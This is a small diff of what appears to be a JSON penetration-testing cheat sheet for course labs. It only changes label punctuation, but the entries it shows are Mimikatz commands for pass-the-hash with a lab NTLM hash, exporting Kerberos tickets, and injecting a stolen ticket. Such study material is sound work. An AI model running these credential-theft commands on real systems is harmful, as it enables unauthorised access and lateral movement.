@@ -46,11 +46,11 @@
       "command": "sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f"
     },
     {
-      "label": "Ch23 — export all tickets to .kirbi files (PEN-200 pattern: steal dave's cifs ticket)",
+      "label": "Ch23 - export all tickets to .kirbi files (PEN-200 pattern: steal dave's cifs ticket)",
       "command": "sekurlsa::tickets /export"
     },
     {
-      "label": "Ch23 — inject a stolen .kirbi ticket into current session then verify with klist",
+      "label": "Ch23 - inject a stolen .kirbi ticket into current session then verify with klist",
       "command": "kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi"
     }
   ],
